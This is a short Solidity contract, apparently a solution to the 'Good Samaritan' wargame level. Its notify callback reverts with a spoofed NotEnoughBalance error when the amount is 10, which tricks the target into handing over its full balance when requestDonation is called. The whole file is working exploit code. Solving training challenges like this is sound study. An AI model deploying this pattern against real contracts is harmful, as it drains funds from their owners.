pragma solidity >=0.8.0 <0.9.0;

import "hardhat/console.sol";
import "./GoodSamaritan.sol";

contract GoodSamaritanAttacker is INotifyable {
    event Amount(uint256 amount);
    error NotEnoughBalance();
    address public target;

    function notify(uint256 amount) external override {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        GoodSamaritan(target).requestDonation();
    }
}
